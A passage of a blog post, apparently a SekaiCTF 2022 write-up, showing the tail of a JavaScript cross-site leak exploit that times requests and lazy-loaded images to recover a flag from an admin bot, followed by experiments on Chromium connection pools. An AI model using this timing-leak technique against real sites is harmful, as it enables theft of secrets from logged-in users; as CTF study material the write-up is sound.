+    <span class="token keyword">const</span> charset <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
+
+    <span class="token comment">// start exploit</span>
+    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">let</span> <span class="token constant">L</span> <span class="token operator">=</span> <span class="token number">0</span>
+      <span class="token keyword">let</span> <span class="token constant">R</span> <span class="token operator">=</span> charset<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span>
+      <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token constant">R</span><span class="token operator">-</span><span class="token constant">L</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> <span class="token constant">M</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token constant">L</span> <span class="token operator">+</span> <span class="token constant">R</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
+        <span class="token keyword">let</span> c <span class="token operator">=</span> charset<span class="token punctuation">[</span><span class="token constant">M</span><span class="token punctuation">]</span>
+        <span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'try_'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> c<span class="token punctuation">)</span>
+        <span class="token keyword">const</span> found <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">testChar</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> c<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token constant">L</span> <span class="token operator">=</span> <span class="token constant">M</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+          <span class="token constant">R</span> <span class="token operator">=</span> <span class="token constant">M</span> <span class="token operator">-</span> <span class="token number">1</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+
+      <span class="token comment">// fallback to linear since I am not familiar with binary search lol</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token constant">R</span><span class="token punctuation">;</span> i<span class="token operator">>=</span><span class="token constant">L</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> c <span class="token operator">=</span> charset<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+        <span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'try_'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> c<span class="token punctuation">)</span>
+        <span class="token keyword">const</span> found <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">testChar</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> c<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'found: '</span><span class="token operator">+</span> flag<span class="token operator">+</span>c<span class="token punctuation">)</span>
+          flag <span class="token operator">+=</span> c
+          <span class="token keyword">break</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+      
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">testChar</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+          <span class="token comment">/*
+            For 3350, you need to test it on your local to get this number.
+            The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
+            If starts with "A", the image should be loaded because it's in the threshold.
+          */</span>
+          inp<span class="token punctuation">.</span>value <span class="token operator">=</span> str <span class="token operator">+</span> <span class="token string">'&lt;br>&lt;canvas height="3350px">&lt;/canvas>&lt;br>'</span><span class="token operator">+</span>Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">length</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span>i</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;img loading=lazy src=/?</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>i<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
+          f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+          <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            <span class="token function">run</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> resolve<span class="token punctuation">)</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> resolve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// if the request is not enough, we can send more by opening more window</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">TARGET</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span>
+      
+      <span class="token keyword">let</span> t <span class="token operator">=</span> <span class="token number">0</span>
+      <span class="token keyword">const</span> round <span class="token operator">=</span> <span class="token number">30</span>
+      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>round<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token keyword">let</span> s <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+          <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">TARGET</span> <span class="token operator">+</span> <span class="token string">'/?test'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">)</span>
+          <span class="token keyword">let</span> end <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+          t <span class="token operator">+=</span> end <span class="token operator">-</span> s
+          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>end <span class="token operator">-</span> s<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">const</span> avg <span class="token operator">=</span> t<span class="token operator">/</span>round
+        <span class="token function">send</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> t <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> <span class="token string">"avg:"</span> <span class="token operator">+</span> avg<span class="token punctuation">)</span>
+
+        <span class="token comment">/*
+          I get this threshold(1000ms) by trying multiple times on remote admin bot
+          for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
+        */</span>
+        <span class="token keyword">const</span> isFound <span class="token operator">=</span> <span class="token punctuation">(</span>t <span class="token operator">>=</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>isFound<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          inp2<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"0"</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+          inp2<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"1"</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token comment">// remember to delete the post to not break our leak oracle</span>
+        f2<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+          <span class="token function">resolve</span><span class="token punctuation">(</span>isFound<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="post-match-review">Post-match Review</span></h2><p>After the game, I saw terjanq’s <a target="_blank" rel="noopener" href="https://twitter.com/terjanq/status/1576605101514313735">solution</a>. He used <code>&lt;script&gt;</code> to do timing, while I used fetch. The difference is that in his case, the loading of <code>&lt;script&gt;</code> was blocked!</p>
+<p>I have recorded two videos below to show the difference:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ixyMZlIcnDI">https://www.youtube.com/watch?v=ixyMZlIcnDI</a> using script</li>
+<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=15CJQ9nzrxs">https://www.youtube.com/watch?v=15CJQ9nzrxs</a> using fetch</li>
+</ol>
+<p>You can see that in the first case, it should be “each page shares the same limit”, which means that the legendary “6 concurrent requests” is for the destination, not like what I previously thought, each page has its own pool.</p>
+<p>But in the second case, it doesn’t seem to be the case, which is also the reason why I misunderstood during the competition. When I asked terjanq, he said it might be due to the difference in partition key.</p>
+<p>I originally wanted to find the answer in the Chromium source code, but found that my skills were too shallow and I could only find the socket pool per group that everyone can find: <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/107.0.5261.1:net/socket/client_socket_pool_manager.cc;l=51">https://source.chromium.org/chromium/chromium/src/+/refs/tags/107.0.5261.1:net/socket/client_socket_pool_manager.cc;l=51</a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Default to allow up to 6 connections per host. Experiment and tuning may</span>
+<span class="token comment">// try other values (greater than 0).  Too large may cause many problems, such</span>
+<span class="token comment">// as home routers blocking the connections!?!?  See http://crbug.com/12066.</span>
+<span class="token comment">//</span>
+<span class="token comment">// WebSocket connections are long-lived, and should be treated differently</span>
+<span class="token comment">// than normal other connections. Use a limit of 255, so the limit for wss will</span>
+<span class="token comment">// be the same as the limit for ws. Also note that Firefox uses a limit of 200.</span>
+<span class="token comment">// See http://crbug.com/486800</span>
+<span class="token keyword">int</span> g_max_sockets_per_group<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token number">6</span><span class="token punctuation">,</span>   <span class="token comment">// NORMAL_SOCKET_POOL</span>
+    <span class="token number">255</span>  <span class="token comment">// WEBSOCKET_SOCKET_POOL</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I didn’t find where the difference was when I sent a request with fetch and when I sent a request with <code>&lt;script&gt;</code>.</p>
+<p>But I did some experiments later. I prepared three hosts:</p>
+<p>A: <a target="_blank" rel="noopener" href="http://exp.test:1234/">http://exp.test:1234</a><br>B: <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a><br>C: <a target="_blank" rel="noopener" href="http://test.ngrok.io(target)/">http://test.ngrok.io(target)</a></p>
+<p>Simply put, C is the target, and C has an endpoint that will give a response after three seconds. Then I tested with AB and AC respectively to see what would happen under different conditions.</p>
+<p>The code is roughly like this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">startFetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>start fetch<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">startScript</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>start script<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">startImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>start img<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">const</span> round <span class="token operator">=</span> <span class="token number">20</span>
+    <span class="token keyword">function</span> <span class="token function">startFetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://test.ngrok.io/block?q='</span><span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+                <span class="token literal-property property">mode</span><span class="token operator">:</span> <span class="token string">'no-cors'</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">startScript</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">let</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span>
+            el<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://test.ngrok.io/block?q='</span><span class="token operator">+</span>i
+            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>el<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">startImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">let</span> el <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span>
+            el<span class="token punctuation">.</span>crossorigin<span class="token operator">=</span><span class="token string">'anonymous'</span>
+            el<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'http://test.ngrok.io/block?q='</span><span class="token operator">+</span>i
+            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>el<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>For example, when A fetches data from C and B also fetches data from C, the one who fetches first wins, and the one who fetches later has to queue, which means that the two share the same connection pool.</p>
+<p>If A uses fetch and B uses img, the two do not interfere with each other, which means that the two use different pools.</p>
+<p>In short, the final situation I tested is: “fetch and script&#x2F;img are two different pools.”</p>
+<p>Then I tested A and C, where C represents fetching data from itself. The result is quite magical.</p>
+<p>If I use fetch for both A and C, the two do not interfere with each other.</p>
+<p>But if I use img for A and fetch for C, C’s fetch will take priority, and A’s img needs to queue.</p>
+<p>Based on the final test results, I summarized that there are two pools in total:</p>
+<ol>
+<li>Fetch from other hosts to the target host</li>
+<li>Fetch from oneself to oneself &amp; loading of script&#x2F;img</li>
+</ol>
+<p>Originally, I expected all of these to share the same pool, but it seems that fetch from other hosts is an additional pool, although I don’t know why.</p>
+<p>Finally, here is the author’s writeup: <a target="_blank" rel="noopener" href="https://brycec.me/posts/sekaictf_2022_challenges">https://brycec.me/posts/sekaictf_2022_challenges</a></p>
+<p>I haven’t read it carefully yet, but it is related to the restriction of all connection pools.</p>
+<p>And recommend an excellent article: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/30558018">How browsers load resources from Chrome source code</a></p>
+<h2><span id="obligatory-calc">Obligatory Calc</span></h2><p>Just briefly describe the solution to this problem:</p>
+<ol>
+<li>The <code>e.source</code> in <code>onmessage</code> is the source window that sends the message. Although it looks like an object at first glance, if it is closed immediately after postMessage, it will become null.</li>
+<li>Accessing <code>document.cookie</code> under the sandbox iframe will result in an error.</li>
+</ol>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2022/10/31/en/hacklu-ctf-2022-writeup/">Hack.lu CTF 2022 Notes</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2022/10/05/en/sekaictf2022-safelist-xsleak/">SekaiCTF 2022 - safelist writeup</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2022/10/08/sekaictf2022-safelist-and-connection/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
